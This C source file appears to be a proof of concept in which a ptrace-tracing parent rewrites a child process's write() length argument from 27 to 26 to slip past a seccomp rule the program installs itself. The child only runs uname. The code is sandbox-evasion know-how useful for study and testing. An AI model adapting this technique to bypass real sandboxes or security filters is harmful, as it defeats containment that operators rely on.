//escape.c
//gcc escape.c -o escape -lseccomp
#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/prctl.h>  
#include <linux/seccomp.h>
#include <seccomp.h>
#include <stdlib.h>
#include <unistd.h>

#define longsize 8

int main() {
    pid_t  pid;
    int rv;
    long orig_rax;
    char *argv[]={"/bin/uname", "-a", NULL};
    char *env[]={NULL};
    char cmd[20] = "/bin/uname";
    long length;
    long addr;
    int insyscall = 0;
    struct user_regs_struct regs;

    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW); // default action: allow

    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 1, SCMP_A2(SCMP_CMP_EQ, 27));

    seccomp_load(ctx);

    prctl(PR_SET_NO_NEW_PRIVS, 1);

    pid = fork();

    if (pid == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        syscall(59, cmd, argv, env);
    } else {
        while (1) {
            waitpid(pid, &rv, WNOHANG);

            if (WIFEXITED(rv)) {
                break;
            }

            orig_rax = ptrace(PTRACE_PEEKUSER, pid, 8 * ORIG_RAX, NULL);

            if (orig_rax == 1) {
                if (insyscall == 0) {
                    printf("Syscall number: %ld\n", orig_rax);

                    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

                    printf("Write called with 0x%llx, 0x%llx, 0x%llx\n", regs.rdi, regs.rsi, regs.rdx);

                    addr = regs.rsi;
                    length = regs.rdx;

                    if(regs.rdx == 27) {
                        regs.rdx = 26;
                    }

                    rv = ptrace(PTRACE_SETREGS, pid, NULL, &regs);

                    insyscall = 1;
                } else {
                    int rax = ptrace(PTRACE_PEEKUSER, pid, 8 * RAX, NULL);

                    printf("\nWrite returned with %d\n", rax);

                    insyscall = 0;
                }

            }
            ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        }
        printf("The child process exits\n");
    }
    return 0;
}
